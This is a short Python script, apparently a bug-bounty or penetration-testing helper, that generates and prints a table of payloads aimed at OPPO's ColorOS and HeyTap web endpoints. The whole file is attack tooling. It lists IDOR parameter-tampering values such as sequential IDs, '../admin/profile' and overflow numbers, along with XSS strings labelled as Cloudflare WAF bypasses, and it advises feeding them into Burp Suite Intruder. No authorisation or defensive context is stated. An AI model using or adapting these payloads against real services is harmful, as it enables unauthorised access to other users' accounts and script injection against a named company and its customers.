import random
from rich.console import Console
from rich.table import Table

console = Console()

def generate_oppo_payloads():
    """Generates payloads optimized for ColorOS and HeyTap endpoints."""
    
    # IDOR / Parameter Tampering (Targeting internal IDs)
    idor_targets = ["uid=", "userid=", "order_id=", "account=", "device_id="]
    idor_payloads = [
        "10001", "00001", "99999", 
        "../admin/profile", "0", "-1", "9223372036854775807"
    ]

    # XSS Bypasses for WAFs like Cloudflare
    xss_payloads = [
        "<svg/onload=alert(1)>",
        "\"><img src=x onerror=confirm(document.domain)>",
        "javascript:alert(1)//",
        "<details/open/ontoggle=alert(1)>"
    ]

    table = Table(title="[bold yellow]OPPO-SPECIFIC PAYLOADS[/bold yellow]")
    table.add_column("Type", style="cyan")
    table.add_column("Payload", style="green")

    for target in idor_targets:
        table.add_row("IDOR Parameter", target + random.choice(idor_payloads))
    
    for xss in xss_payloads:
        table.add_row("XSS/WAF Bypass", xss)

    console.print(table)
    console.print("[i]Tip: Use these in Burp Suite Intruder for the best results.[/i]")
